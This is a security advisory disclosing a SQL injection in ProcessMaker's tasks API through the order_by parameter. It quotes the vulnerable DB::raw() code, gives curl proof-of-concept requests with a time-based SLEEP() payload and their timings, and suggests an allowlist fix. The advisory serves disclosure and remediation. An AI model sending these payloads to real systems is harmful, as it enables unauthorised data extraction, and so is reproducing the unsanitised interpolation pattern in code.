SQL Injection in GET /api/1.0/tasks via order_by Parameter

Product: ProcessMaker (ProcessMaker/processmaker)
Affected version: develop @ 492e4a560a2b92372d45021f25962ba83386f8c6 (2026-09-03), released as 2026.14.2
Reporter: Turki Hufais (GitHub: TurkiTheCreator)
Vulnerability: CWE-89, SQL Injection
CVE: CVE-2026-107803 (GHSA-xf7p-gp7c-w7gh)
Status: Fixed in 2026.14.3. Confirmed against a locally hosted test instance

Summary

The GET /api/1.0/tasks endpoint is vulnerable to SQL injection through the order_by parameter.

User-controlled input is passed into a raw SQL expression without an allowlist or sufficient validation. This allows an authenticated attacker to inject SQL expressions into the generated query.

I confirmed the vulnerability using a time-based MySQL payload with SLEEP(). The server response time increased by approximately the requested delay, confirming that the injected expression was executed by MySQL.

Exploitation requires a valid ProcessMaker account, but no elevated role or additional permission is required.

Affected Component

Route:

GET /api/1.0/tasks

The route is defined in:

routes/api.php:223

The vulnerable code is located in:

ProcessMaker/Traits/TaskControllerIndexMethods.php:198-238

The issue occurs in applyColumnOrdering():

private function applyColumnOrdering($query, $request)
{
    $direction = $request->input('order_direction', 'asc');
    $orderColumns = explode(',', $request->input('order_by', 'updated_at'));

    foreach ($orderColumns as $column) {
        $parts = explode('.', $column);
        $table = count($parts) > 1 ? array_shift($parts) : 'process_request_tokens';
        $columnName = array_pop($parts);

        ...

        } elseif (
            $table === 'process_requests' ||
            $table === 'process_request' ||
            $table === 'processRequests'
        ) {
            if ($columnName === 'id') {
                $query->orderBy('process_request_id', $direction);
            } else {
                $query->orderBy(
                    DB::raw("(select
                            $columnName
                        from
                            process_requests
                        where
                            process_requests.id = process_request_tokens.process_request_id
                    )"),
                    $direction
                );
            }
        }
    }
}

The $columnName value originates from the user-controlled order_by parameter.

When process_requests is selected as the table, $columnName is inserted directly into the DB::raw() expression. There is no allowlist, parameter binding, or validation restricting it to legitimate column names.

As a result, attacker-controlled SQL can reach the database query.

Reproduction

Environment

  • ProcessMaker commit: 492e4a560a2b92372d45021f25962ba83386f8c6
  • ProcessMaker version: 2026.14.2
  • PHP: 8.4
  • MySQL: 8.0
  • Locally hosted instance
  • Authenticated ProcessMaker user with no elevated privileges

1. Baseline request

curl -s -o /dev/null -w 'time=%{time_total}s status=%{http_code}\n' \
  -H 'Authorization: Bearer $TOKEN' \
  -H 'Accept: application/json' \
  'http://<host>/api/1.0/tasks'

Example result:

time=0.116s status=200

2. Time-based SQL injection

The following request injects a SLEEP(5) expression into the generated SQL:

curl -s -o /dev/null -w 'time=%{time_total}s status=%{http_code}\n' \
  -H 'Authorization: Bearer $TOKEN' \
  -H 'Accept: application/json' \
  --data-urlencode 'order_by=process_requests.(select sleep(5))' \
  -G 'http://<host>/api/1.0/tasks'

Result:

time=5.113s status=200

3. Second timing test

The test was repeated using a three second delay:

curl -s -o /dev/null -w 'time=%{time_total}s status=%{http_code}\n' \
  -H 'Authorization: Bearer $TOKEN' \
  -H 'Accept: application/json' \
  --data-urlencode 'order_by=process_requests.(select sleep(3))' \
  -G 'http://<host>/api/1.0/tasks'

Result:

time=3.095s status=200

Results

Request Observed response time
Baseline 0.116s
SLEEP(5) 5.113s
SLEEP(3) 3.095s

The response time closely follows the delay specified in SLEEP() while the baseline request completes normally.

This confirms that the supplied expression is being executed by MySQL rather than being rejected or ignored.

Full request and timing logs are in the PoC log below.

Impact

This vulnerability provides a blind SQL injection primitive against the ProcessMaker database.

An authenticated attacker may be able to use time-based SQL injection to infer and extract data accessible to the database user configured for ProcessMaker.

Depending on the database permissions and deployment configuration, this could expose sensitive application data stored in the database, including process-related records and other application data.

I did not demonstrate modification of database records or a denial of service condition.

Stacked queries were also not demonstrated in the tested MySQL configuration.

Authentication and Privileges

Authentication is required to reach the vulnerable endpoint and trigger the SQL injection.

Exploitation does not require an elevated role or additional application permissions beyond a valid ProcessMaker account.

CVSS 3.1

Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
Base Score: 6.5 (Medium)

PR:L is used because exploitation requires a valid authenticated ProcessMaker account, but no elevated privileges are required.

S:U is used because the demonstrated impact remains within the security authority of the vulnerable ProcessMaker application. Cross-tenant impact was not tested.

If the vulnerable endpoint can be exploited across tenant boundaries in a supported multitenant deployment, the severity should be reassessed based on the actual tenant isolation model.

Suggested Fix

The preferred fix is to allowlist the columns that can legitimately be used with order_by.

For example:

private const SORTABLE_COLUMNS = [
    'process_requests' => [
        'id',
        'name',
        'case_number',
    ],
];

The application should map user-supplied sort values to trusted column names and reject or ignore any value that is not present in the allowlist.

User-controlled input should not be interpolated directly into DB::raw().

A strict identifier check such as:

preg_match('/^[a-zA-Z0-9_]+$/', $columnName)

would prevent the demonstrated payload, but an explicit allowlist is preferred because it limits sorting to columns that the application actually intends to expose.

The existing allowlist-based approach in ProcessMaker\Http\Controllers\Api\CasesRetentionController may also be useful as a reference.

Additional Notes

This finding appears to be separate from previously published ProcessMaker SQL injection issues affecting legacy 3.x functionality such as reportTables_Ajax, clientSetupAjax, and eventsAjax.

Those issues affect different routes and an older codebase.

The potential cross-tenant impact was not tested and is included only for vendor assessment.
